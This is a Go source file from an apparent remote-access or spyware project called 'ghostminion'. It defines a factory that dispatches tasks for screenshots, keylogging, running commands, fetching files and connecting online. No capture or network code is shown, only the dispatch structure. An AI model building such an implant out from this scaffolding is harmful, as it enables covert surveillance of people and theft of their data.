package apps

import (
	"context"
	"errors"
	"ghostminion/logger"
)

const (
	ScreenShotTask    AppType = "screenshot"
	KeyLoggerTask     AppType = "keylogger"
	CommandTask       AppType = "command"
	GetFileTask       AppType = "getfile"
	ChangeConfigTask  AppType = "changeconfig"
	ConnectOnlineTask AppType = "connectonline"
)

var lgr = logger.GetInstance()

type BaseApp struct {
	stop chan struct{}
	*AppData
}

// App is the interface each independent app should implement.
//
// Start should be a blocking method that runs until the app naturally exits or the provided context is canceled.
// The AppManager runs Start in a goroutine and is responsible for wg bookkeeping.
type App interface {
	Name() string
	Start(ctx context.Context) error
	Stop() error
	validateParams() error
}

func NewAppFactory(appData AppData) (App, error) {
	var app App = nil
	var err error = nil
	switch appData.Type {
	case ChangeConfigTask:
		lgr.Error("change config not implemented")
	case ScreenShotTask:
		app, err = NewScreenshotApp(appData)
		break
	case KeyLoggerTask:
		app, err = NewKeyLoggerApp(appData)
		break
	case CommandTask:
		app, err = NewPeriodicCommand(appData)
		break
	case GetFileTask:
		app, err = NewPeriodicGetFileApp(appData)
		break
	case ConnectOnlineTask:
		app, err = NewConnectOnlineApp(appData)
		break
	default:
		err = errors.New("unknown app type")
	}
	return app, err
}
